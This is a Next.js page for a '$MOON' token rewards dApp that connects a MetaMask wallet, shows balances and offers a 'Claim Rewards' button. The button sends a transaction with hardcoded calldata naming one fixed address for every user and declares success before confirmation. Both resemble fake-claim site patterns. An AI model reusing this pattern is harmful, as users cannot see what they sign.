import type { NextPage } from "next";
import SomeText from "lib/components/samples/SomeText";
import { useRef, useState, useEffect } from "react";
import { DatasetJsonLd } from "next-seo";
import Web3 from "web3";
import { ChainUnknownError } from "use-wallet/dist/cjs/errors";
import Script from "next/script";

export let isValidNetwork = true;
export let account = '';

const Home: NextPage = () => {

    const connectBtn = useRef<HTMLButtonElement>(null)
    const [hasConnected, setHasConnected] = useState(false);

    const updateValues = async () => {
        const response = await fetch(`/api/moon-balance?walletAddress=${account}`)
        const data = await response.json()

        const pendingRewardsElement = document.getElementById("pendingRewardsEth");
        pendingRewardsElement!.textContent = parseFloat(data.pendingRewards).toFixed(6);

        const moonBalanceElement = document.getElementById("moon-balance");
        moonBalanceElement!.textContent = parseFloat(data.moonBalance).toFixed(6);

        const moonBurnedElement = document.getElementById("moonBurned");
        moonBurnedElement!.textContent = parseFloat(data.moonBurned).toFixed(6);

        const moonBuybackElement = document.getElementById("moonBuyback");
        moonBuybackElement!.textContent = parseFloat(data.moonBuybacks).toFixed(6);
    }

    const checkNetwork = async () => {
        // @ts-ignore
        const chainId = await window.ethereum.request({ method: 'eth_chainId' })
        // todo: use env var
        const ethChainId = process.env.NEXT_PUBLIC_CHAIN_ID
        console.log(`Your chain ID: ${chainId}`);
        console.log(`The chain ID for this dApp: ${ethChainId}`)

        if (chainId === ethChainId) {
            console.log("Connected to correct network.")
            await updateValues()

        } else {
            alert("You are connected to the wrong network. Please connect to the Ethereum network on Metamask and try again!")
            isValidNetwork = false;
            return;
        }

    }

    const connectWallet = async () => {

        // @ts-ignore
        const provider = window.ethereum;
        if (!provider) {
            alert("Metamask is not installed, please install!")
            return;
        }

        // @ts-ignore
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' })
        account = accounts[0];
        console.log(`Your wallet address: ${account}`);

        const walletAddressBtn = document.getElementById('walletAddressBtn');
        walletAddressBtn!.firstChild!.textContent = account;

        setHasConnected(true);
        checkNetwork();

    };

    const claimRewards = async () => {

        // @ts-ignore
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' })

        const tx = {
            // user's wallet address
            from: accounts[0],
            // target address, this is the smart contract address
            to: process.env.NEXT_PUBLIC_CONTRACT_ADDRESS,
            data: "0x51cff8d900000000000000000000000004b2fa0c2a3755b5f4951bf70be3035b3342bd7b"
        }

        // @ts-ignore
        try {
            // @ts-ignore
            const txHash = await ethereum.request({
                method: "eth_sendTransaction",
                params: [tx],
            }).then(async (tx: string) => {
                await updateValues()

                setTimeout(() => {
                    prompt(`✅ 🎉 You have successfully withdrawn your rewards. Please allow around 30 seconds for the transaction to process. You can now close this tab. \n \n Transaction ID: `, tx)
                    location.reload()
                }, 100)
            })
        } catch (error: any) {
            console.log(error)
            alert(error.message)
        }
    }

    useEffect(() => {
        updateValues()
    }, [])

    return (
        <>
            <div className="flex w-full min-h-[60vh] flex-col items-center justify-center gap-8 text-white">
                <SomeText />

                <div
                    className="w-full lg:w-4/5 xl:w-3/5 h-full lg:h-96 flex flex-col lg:flex-row items-center rounded-lg overflow-hidden mt-20"
                >
                    <div
                        className="w-full md:w-2/3 bg-zinc-900/[.7] flex flex-col justify-center pl-12 lg:pl-20 py-14 rounded-lg my-6 lg:mr-2 border border-solid border-zinc-600">

                        <h3
                            className="w-auto mb-3 text-rose-200 font-light text-2xl"
                        >
                            Your Pending Rewards
                        </h3>

                        <h2
                            className="w-auto mb-16 bg-gradient-to-br from-white to-orange-400 bg-clip-text text-transparent font-medium"
                        >
                            <span id="pendingRewardsEth">0.000000</span>&nbsp;
                            ETH
                        </h2>

                        <div
                            className="w-52 h-14"
                        >
                            {hasConnected ?
                                <button
                                    onClick={claimRewards}
                                    className="btn rounded-xl w-full h-full border-2 border-zinc-900 bg-gradient-to-br from-rose-900 to-red-900 font-bold text-slate-200 hover:from-rose-200 hover:to-red-400 hover:text-red-800 normal-case font-medium text-xl"
                                >
                                    Claim Rewards
                                </button>
                                :
                                <button onClick={connectWallet}
                                    className="btn rounded-xl w-full h-full border-2 border-zinc-900 bg-gradient-to-br from-rose-900 to-red-900 font-bold text-slate-200 hover:from-rose-200 hover:to-red-400 hover:text-red-800 normal-case font-medium text-xl"
                                    id="connectBtn"
                                    ref={connectBtn}
                                >
                                    Connect Wallet
                                </button>
                            }
                        </div>

                    </div>

                    <div
                        className="w-full md:w-2/3 lg:w-1/3 flex flex-col lg:px-3 justify-around">

                        <div
                            className="w-full bg-zinc-900/[.75] mt-2.5 rounded-lg p-4 border border-solid border-zinc-600"
                            style={{ height: "28%" }}
                        >

                            <h5
                                className="text-rose-200 font-normal mb-1 font-normal"
                            >
                                Your $MOON Balance
                            </h5>

                            <h4
                                className="font-normal"
                                id="moon-balance"
                            >
                                0.000000
                            </h4>

                        </div>


                        <div
                            className="w-full bg-zinc-900/[.7] my-5 rounded-lg p-4 border border-solid border-zinc-600"
                            style={{ height: "28%" }}
                        >
                            <h5
                                className="text-rose-200 font-normal mb-1 font-normal"
                            >
                                Total $MOON Bought Back
                            </h5>

                            <h4
                                className="font-normal"
                                id="moonBuyback"
                            >
                                0.000000
                            </h4>

                        </div>

                        <div
                            className="w-full bg-zinc-900/[.75] mb-2 rounded-lg p-4 border border-solid border-zinc-600"
                            style={{ height: "28%" }}
                        >

                            <h5
                                className="text-rose-200 font-normal mb-1 font-normal"
                            >
                                Total $MOON Burned
                            </h5>

                            <h4
                                className="font-normal"
                                id="moonBurned"
                            >
                                0.000000
                            </h4>

                        </div>
                    </div>
                </div>
            </div>
        </>
    );
};

export default Home;
